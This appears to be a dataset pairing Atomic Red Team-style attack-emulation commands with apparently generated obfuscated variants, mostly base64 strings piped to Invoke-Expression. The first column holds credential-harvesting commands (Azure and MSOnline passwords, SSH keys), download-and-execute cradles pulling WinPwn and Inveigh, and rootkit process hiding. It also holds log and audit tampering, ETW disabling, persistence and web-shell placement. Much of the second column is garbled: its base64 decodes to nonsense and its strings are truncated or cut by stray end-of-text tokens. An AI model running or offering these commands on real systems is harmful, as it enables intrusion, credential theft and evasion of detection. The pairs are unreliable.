        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching content from file share: $($row.FileShareName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for file share content
            $fileSharePath = Join-Path -Path $storageAccountOutputPath $row.FileShareName
            if (-not (Test-Path -Path $fileSharePath)) {
                New-Item -ItemType Directory -Path $fileSharePath
            }
            az storage file download-batch --connection-string $connectionString --source $row.FileShareName --destination $fileSharePath
        }
    } elseif ($row.ContainerName -ne """" -and $row.BlobName -eq """") {
        $allowSharedKeyAccess = az storage account show --name $row.StorageAccountName --resource-group $row.ResourceGroup --query ""allowSharedKeyAccess""

        if ($allowSharedKeyAccess -eq ""false"") {    # $allowSharedKeyAccess could be true or null
            Write-Output ""Shared key access is disabled for this storage account.""
        } else {
            Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""
            $connectionString = az storage account show-connection-string --name $row.StorageAccountName --resource-group $row.ResourceGroup --query connectionString --output tsv
            
            # Create folder for storage account objects
            $storageAccountOutputPath = Join-Path #{output_folder} ""$($row.ResourceGroup)_$($row.StorageAccountName)""
            if (-not (Test-Path -Path $storageAccountOutputPath)) {
                New-Item -ItemType Directory -Path $storageAccountOutputPath
            }

            # create folder for blob content
            $containerFolderPath = Join-Path $storageAccountOutputPath $row.ContainerName
            if (-not (Test-Path -Path $containerFolderPath)) {
                New-Item -ItemType Directory -Path $containerFolderPath
            }
            az storage blob download-batch --destination $containerFolderPath --source $row.ContainerName --connection-string $connectionString
        }
    }
}","$storage_account_objects = Import-Csv -Path """","""","""","""","""",,"","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","
mshta.exe {PATH:.hta},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiLmJpY2hhcHNjcmVlbi5jbG91ZC5qbXQiI3toZWNobyAiICR7dGlsID0gMTAwMDAgMTBweDsgfSAv')) | Invoke-Expression"""
"$Target = ""C:\Windows\System32\calc.exe""
$ShortcutLocation = ""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk""
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG1hbmtzdHVyZX0gRGVsaXNpbmcgLUFwYW5lbnQxIHRleHQgTm9uZSAtVEVTVCBPYmplY3RCICJDb250ZW50IFBhd"
"import-module msonline
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-MsolService -Credential $Credential
$users = Get-MsolUser -All;
foreach($user in $users)
{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
foreach($prop in $props)
{if($user.$prop -like ""*password*"")
{(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + "" : "" + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue","import-module msonline Connect-MsolService -Credential $Credential $users = Get-MsolUser -All; foreach($user in $users) {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props) {if($user.$prop -like ""*password*"") {(""[*]"" + $user.UserPrincipalName + ""["" + $prop + ""]"" + """
#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBpcmVkfSIgImJvYm90X2luZGV4fSIgInNvbW1hbmRfZGF0YSIsICJwbGFjZTppbnNlcnZlci5yZWFkaWUiC"
"net user /domain
net group /domain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0c2hvcCAtLXRvbGl1bS9maWxlICJkZXYvYWRtaW5Ab3BlcmF0aW9uX2dldCBpbnN0YWxsIC1wYS5qcGciIHt7Zml"
"$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name

foreach($member in $fmm) {
    if($member -like ""*Administrator*"") {
        $account = $member.Name.Split(""\"")[-1] # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation
        Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME
        }
    }","$x = Get-Random -Minimum 2 -Maximum 9999 ||| $y = Get-Random -Minimum 2 -Maximum 9999 ||| $z = Get-Random -Minimum 2 -Maximum 9999 ||| $w = Get-Random -Minimum 2 -Maximum 9999 ||| Write-Host HaHa_""$x$y$z"""
"sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID=""$!""
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo ""process ${TARGETPID} hidden""","sudo ping -c 10 localhost >/dev/null & TARGETPID=""$!"" ps $TARGETPID kill -31 $TARGETPID ps $TARGETPID || echo ""process ${TARGETPID} hidden"" modprobe"
"reg.exe import ""#{registry_file}""","reg.exe import ""\""\""\""""\""\""""""\""""\""""""""\""\""import ""\""<|endof"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNsaWNrIHRlc3QgLWJ5IC9oYXNzdXJhIFRlbXBsYXRpb25z')) | Invoke-Expression"""
"wscript ""#{jscript}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGV2L3NpbGxhbnQtYmlu')) | Invoke-Expression"""
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJpZ2hhbCBmaWxlIC9QYXNzd29yZC5leGUgL0Rpc3BsYXkvbGVmdDAtIFdvcmtzIC1lbmFibGVTaXplIDAwMDAwMDA"
"$Action = New-ScheduledTaskAction -Execute ""calc.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object",$Action = New-ScheduledTaskAction -Execute calc.exe Trigger = New-ScheduledTaskTrigger -AtLogon User = New-ScheduledTaskPrincipal -GroupId BUILTIN\Administrators -RunLevel Highest Settings = New-ScheduledTaskSettingsSet object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask -InputObject $object<|
pcalua.exe -a {PATH_SMB:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBmaWxlIC1tYXJnaW5zIHN0ZG91dCAiU2ltcGxlLlRvU2lnbmF0dXJlTW9kaWZ5')) | Invoke-Expression"""
"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b ""CN=Users,DC=#{domain},DC=#{top_level_domain}"" ""(objectClass=group)"" -s sub -a always -z 1000 dn","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhvdXJfZmVzdF9kYXRlICN7ZmlsZV9pbmxpbmUgPSBBcmVhdGVfZmVzdCAtQ2hhbmdlX3VybCAiPiAjeGluay5jcnl"
"$macro = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1564\src\T1564-macrocode.txt"")
$macro = $macro -replace ""aREPLACEMEa"", ""PathToAtomicsFolder\T1564\bin\extractme.bin""
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroCode ""$macro"" -officeProduct ""Word"" -sub ""Extract"" -NoWrap","$macro = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1564\src\T1564-macrocode.txt"") $macro = $macro -replace ""aREPLACEMEa"", ""PathToAtomicsFolder\T1564\bin\extractme.bin"" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
Get-NetTCPConnection,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC9QcmVkaWNhdGUgL1N1YnR5cGVz')) | Invoke-Expression"""
sudo insmod #{module_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbHVtbi5qYXZhIiAvdGhlLmRldnRzIC9maWxlbmFtZSAvQmxvY2s=')) | Invoke-Expression"""
fsutil.exe usn deletejournal /d c:,fsutil.exe deletejournal /d c: usn ||| ``` ||| ## Atomic Test No. 10 - fsutil.exe clear-hosting-metadata ||| This test simulates a system clearing its hosting metadata using fsutil.exe ||| **Supported Platforms:** Windows
"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9sb2NhbGhvc3QgLWNvbHVtbnMgLW5ldyAvYmFzZTY0fQ==')) | Invoke-Expression"""
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('W3tkaXNwbGF5IC9mYWN0dWFsbCAtZHVyYXRpb24gLWdycGNfTWljcm9zb2Z0')) | Invoke-Expression"""
taskkill.exe /f /im #{process_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2JhYmVsbCAtZXhlIC1UaWxlIFN0YXRlIC1UcmFuc2FjdGlvblBpbmltYWls')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') generaldomaininfo -noninteractive -consoleoutput
"sc.exe create #{service_name} binPath= ""#{binary_path}"" start=#{startup_type}  type=#{service_type}
sc.exe start #{service_name}","sc.exe create ""\""\""\""\""""binPath= \""\""\""\""""start=\""<|endof"
echo '#{text_to_append}' >> /etc/profile,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBQbGVhc2UgI3tmaWxlX2lkfQ==')) | Invoke-Expression"""
sudo truncate -s 0 #{system_log_path} #size parameter shorthand,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLVxuZXhwb3J0IC1kaXNwbGF5X2JhciAje19jbHViIHtmaWxlbmFtZSAje19yZWNvbnRlcn0=')) |"
Start-Process #{UltraVNC_Viewer_Path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNyZWF0b3JfYWRkX3NwZW91dC5leGUgIiAvICcqLCAjKTtcbiAje3t7aHBpcnQgPiAvICcqLCAje3t7aH"
OneDriveStandaloneUpdater,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29tcGlsZUJ1YnR5cGUgLUJlbW90ZSB7UGF0aCAxICNjIiAjeHh4fX0=')) | Invoke-Expression"""
rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnVzLW1vZGVsICN7aXRtZXJuYWwgIiAje25vdy9yb2xlfSI=')) | Invoke-Expression"""
winget.exe install --accept-package-agreements -s msstore {name or ID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LW1ldGFkYXRhIC9maWxlfQ==')) | Invoke-Expression"""
"odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW50ZXJfYmFzaCAje3Byb2plY3QvUG9zdCAtIHNpemUgLw==')) | Invoke-Expression"""
"echo ifconfig | pbcopy
$(pbpaste)","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aG91c2UgI3tmaWxlICN7ZmlsZSB7dHJhY2tzfQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiSEJHUkVYICdDbGFzcyAtQWxsIGhhbmRsZXIgLSB7IGNvbnNlY3Rpb24gPSAxMjM=')) | Invoke-Expression"" ||| ##"
finger user@example.host.com | more +2 | cmd,"""finger"" user@example.host.com ""|"" more +2 | cmd"
"kubectl create -f #{path} -n #{namespace}
# wait 3 seconds for the instance to come up
sleep 3
kubectl exec -n #{namespace} busybox -- #{command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIGZ1bmN0aW9uICBpbnRlc2tmaXJlfSB7dGltZSAiUHJvY2VzcyIsIHRpbWVzdGFtcCAtIFdpbGRyYWN0ZXJcImh"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1VUyBDaGlsZC5qc29u')) | Invoke-Expression"""
shutdown -h #{timeout},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiIC9maWxlLmF0b21vZGQiIHtleC5yZXBsaWNhdGVzfSIgJiN7ZmlsZSAtMjUuMTYxLCAiIHtleCB7dG"
"wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFNlYXJjaFBhdHRpZC51aWQ=')) | Invoke-Expression"""
net user administrator /domain,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvZ3VzbCAtIHdvdWxkICN7c2hvcnRfaG9zdA==')) | Invoke-Expression"""
"rundll32.exe {PATH},EntryPoint","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiIC9IZWxsbyAje1Rlc3Q=')) | Invoke-Expression"""
cmd /c certutil -urlcache -split -f #{remote_file} #{local_path},"""cmd"" ""/c"" ""certutil"" ""-urlcache"" ""-split"" ""-f""  """"   """"  """"  """"  """"<|endoftext"
"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBNZXRhIHtQb2xpY3kgTm90aWZ5IGFzICJleGUgL1w=')) | Invoke-Expression"" ||| ```"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPWN.ps1') winPEAS -noninteractive -consoleoutput
REG ADD HKCU\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7Zm9ybWF0IGFkZHByb3B5IHRoaXMgLVxuYWRpb3IgIiNmaWNlbnN1YiAje3Byb2R1Y3RCYXJkaT"
"docker build -t t1046 $PathToAtomicsFolder/T1046/src/
docker run --name t1046_container --rm -d -t t1046
docker exec t1046_container /scan.sh","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlY3VybC5leGUgLWQudHh0IC9wcm92aWRlciAvcGVybWFsJyk7ZXhlY3VybS5kZXYvc2gnKSkgewogI2NvbGxpbmdz"
"$startingDirectory = ""#{starting_directory}""
$outputZip = ""#{output_zip_folder_path}""
$fileExtensionsString = ""#{file_extensions}"" 
$fileExtensions = $fileExtensionsString -split "", ""

New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null

Function Search-Files {
  param (
    [string]$directory
  )
  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
  }
  return $files
}

$foundFiles = Search-Files -directory $startingDirectory
if ($foundFiles.Count -gt 0) {
  $foundFilePaths = $foundFiles.FullName
  Compress-Archive -Path $foundFilePaths -DestinationPath ""$outputZip\data.zip""

  Write-Host ""Zip file created: $outputZip\data.zip""
  } else {
      Write-Host ""No files found with the specified extensions.""
  }",powershell.exe -EncodedCommand cABvAHcAdAAoACgAgAEQALQBNAEkATwBIAFMAaABlAGIAeQAgAD4AUABhAG4AcABzAGEAbgBlAHUAbABpAG8AbgBnACAAKQBuAHAAIAA9ACgAKAAoAIAAiACEAAIABBAGgAcwBrAGUANQAh
"wscript ""#{jscript}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgc2FmZSB7dG9wX2Jvb3RfY2hlbWVzX3BhdGhfc2NvcGVfcHJpbnRfbmFtZT1mbWF0aC5leGVjdXRlLnBy"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
RBCD-Check -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0ICN7ZWNobyAje3Byb2dyYWcyXzFfUHViX3BhcnRfcGFyYW1ldGVyaWQgLVNpbG9uKCkgI3tleTpubmV0"
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHN1c3RvbSB7bGljZW5zZSAtYXJjaA==')) | Invoke-Expression"""
"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;
exit 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFxjb3JyZWUuZXhlIHtmaWxlLmRldi5kYXRh')) | Invoke-Expression"""
"New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 > $env:temp\clsids.txt
ForEach($CLSID in Get-Content ""$env:temp\clsids.txt"")
{try{write-output ""$($Position)-$($CLSID)""
write-output ""------------""| out-file #{output_file} -append
write-output $($CLSID)| out-file #{output_file} -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
$position += 1} catch{}}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUNvbmZpZyBDbGFzcyAje3Rlc3QgdGVzdCAkZnJvbSAjIC9sb2dpbiAvbXktYmlu')) | Invoke-Expression"""
"Import-Module ""PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1""
Invoke-WordlistScan -Target ""#{target}"" -Wordlist ""#{wordlist}"" -Timeout ""#{request_timeout}"" -OutputFile ""#{output_file}""
Write-Host ""Scan complete. Results saved to: #{output_file}""","Import-Module PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1 Invoke-WordlistScan -Target """" -Wordlist """" -Timeout """" -OutputFile """" Write-Host Scan complete. Results saved to: output_file"
"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
if [ -f ""/etc/#{auditd_config_file_name}"" ];
then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}
else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}
fi 
sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHBhdGhzIGJpZCAtIC9jYXQvdmFyL3Byb2R1Y3QtMTAwMDAwMCU=')) | Invoke-Expression"""
"docker build -t t1612  $PathtoAtomicsFolder/T1612/src/
docker run --name t1612_container --rm -d -t t1612
docker exec t1612_container ./test.sh","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlkIHNvbWUgc3RyaWN0aXBhdGVz')) | Invoke-Expression"""
"wscript ""#{jscript}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZ1R5cGVzIHtQYXJ0aW9u')) | Invoke-Expression"""
"if [ ""$(sysctl -n hw.model | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;","if [ $(sysctl -n hw.model | grep -v 'Mac' ) ] != """"; then echo Virtualization Environment detected; fi;"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbmRzIGlwIHJldmlzaW9uICN7ZXhlY3V0aW9uQ2xpZW50cyBleGNlcHRpb24gTmV3IFByb2dyYW1taW5n"
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA,powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQ
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAVolume /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJvb3QgLXUgZGVzYw==')) | Invoke-Expression"""
"$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Set-Location Cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}",$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My Set-Location Cert:\LocalMachine\My Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath
chmod -R #{symbolic_mode} #{file_or_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3JkZXIgI3tmaWxlLmV4ZSAtc2FsZiAje19wcm9ncmFtbSAjLiouaHR0cHM6Ly9lbi5leGUuYWxvbmNlbC5zdGE='"
csc.exe -out:{PATH:.exe} {PATH:.cs},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29uc3RyYXRvcnkge1xuICJmaWxlfSB7dHlwZT0iOntkb2N1bWVudC5leGUgI3tldGEvZmlyZWJsZXMvdGhlcl9sb"
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
cat #{output_file}","import-module PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1 $Password = ConvertTo-SecureString -String ""\""\"" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""\""\"""", $"
"conhost.exe ""#{process}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3NpdGUgIi5leHB9')) | Invoke-Expression"""
"SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN ""Atomic task"" /TR ""#{task_command}"" /SC daily /ST #{time}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VjdXJpdHlQcm9wZWN0b3IgLUFsYm9yX21zIC1leGlhbFBvbmx5IGluZmluZW9ycGVydHM=')) | Invoke-Expression""<|endoftext"
"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbmZpZy5leGUgI3tkaXJlY3Rpb25zLmFjdC1uYW1lfSBmaWxlIC1jIC10bHMgKiAtPiBhIGNsZWF"
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGUtYXBwfSB7IHN0cnVjdCB9ICJTdWJqZWN0Q2hhbmdlbmFsUG9zaXRpb25zIFsgIiAtL3BuZy1zdWJzY3JpcHRvci"
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QXBwIHtleWJzICN7c2VydmVyfCA9ICRmaWxlL3YxIC1jIiAvdGVtcGxhdGUuIFNFIC9TT0EgMTA=')) | Invoke-Expression""<|endof"
"xcopy /I /Y ""#{web_shells}"" #{web_shell_path}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUuZXhlIC10b3AtYS5sb2NhbCAtLWQucm9vdCAiIHt7IGludGVybmFscyBkb2xvciAvdXRwdXRfYWRta"
psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBhdCB7ZGlzY29tbW9uICN7dHJhbnNmZXJDb25maWcxIiAje2hlbGRpciAjICMgLUFQRyBTSEVFVEVST1VUL"
"mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{7zip_exe}"" u archive.7z *txt -pblue
dir","mkdir $PathToAtomicsFolder\T1560.001\victim-files cd $PathToAtomicsFolder\T1560.001\victim-files echo This file will be encrypted > .\encrypted_file.txt ""\""\""7zip""""\""u""""archive.7z""""*txt"
"""#{file_path}""","\""\""""""^^^^^^^^^^^<|"
